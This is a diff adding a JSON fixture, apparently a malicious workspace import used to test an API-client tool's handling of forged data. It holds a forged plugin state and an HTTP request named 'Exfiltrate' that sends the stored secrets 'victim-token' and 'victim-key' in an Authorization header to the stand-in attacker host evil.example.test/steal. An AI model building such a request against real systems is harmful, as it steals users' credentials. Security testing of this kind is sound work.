@@ -1,0 +1,94 @@
+[
+  {
+    "body": {},
+    "createdAt": 1763251200000,
+    "createdBy": "user",
+    "description": "",
+    "externalKey": null,
+    "id": "m-env-group",
+    "kind": "core:group",
+    "name": "Forged env group",
+    "parent": null,
+    "plugin": null,
+    "pluginVersion": null,
+    "pos": 0,
+    "refs": [],
+    "rev": 1,
+    "tags": [],
+    "tree": "env",
+    "updatedAt": 1763251200000,
+    "updatedBy": "user"
+  },
+  {
+    "body": {
+      "params": {
+        "active": "9.9.9"
+      }
+    },
+    "createdAt": 1763251200000,
+    "createdBy": "user",
+    "description": "",
+    "externalKey": null,
+    "id": "m-state",
+    "kind": "core:plugin-state",
+    "name": "Forged plugin state",
+    "parent": null,
+    "plugin": null,
+    "pluginVersion": null,
+    "pos": 1,
+    "refs": [],
+    "rev": 1,
+    "tags": [],
+    "tree": "plugin-state",
+    "updatedAt": 1763251200000,
+    "updatedBy": "user"
+  },
+  {
+    "body": {},
+    "createdAt": 1763251200000,
+    "createdBy": "user",
+    "description": "",
+    "externalKey": null,
+    "id": "m-group",
+    "kind": "core:group",
+    "name": "Malicious",
+    "parent": null,
+    "plugin": null,
+    "pluginVersion": null,
+    "pos": 2,
+    "refs": [],
+    "rev": 1,
+    "tags": [],
+    "tree": "resources",
+    "updatedAt": 1763251200000,
+    "updatedBy": "user"
+  },
+  {
+    "body": {
+      "body": "",
+      "headers": "Authorization: Bearer {{secret:victim-token}}",
+      "method": "GET",
+      "token": {
+        "secret": "victim-key"
+      },
+      "url": "http://evil.example.test:8080/steal"
+    },
+    "createdAt": 1763251200000,
+    "createdBy": "user",
+    "description": "",
+    "externalKey": null,
+    "id": "m-req",
+    "kind": "org.onedesk.http:request",
+    "name": "Exfiltrate",
+    "parent": "m-group",
+    "plugin": "org.onedesk.http",
+    "pluginVersion": "0.1.0",
+    "pos": 0,
+    "refs": [],
+    "rev": 1,
+    "tags": [],
+    "tree": "resources",
+    "updatedAt": 1763251200000,
+    "updatedBy": "user"
+  }
+]
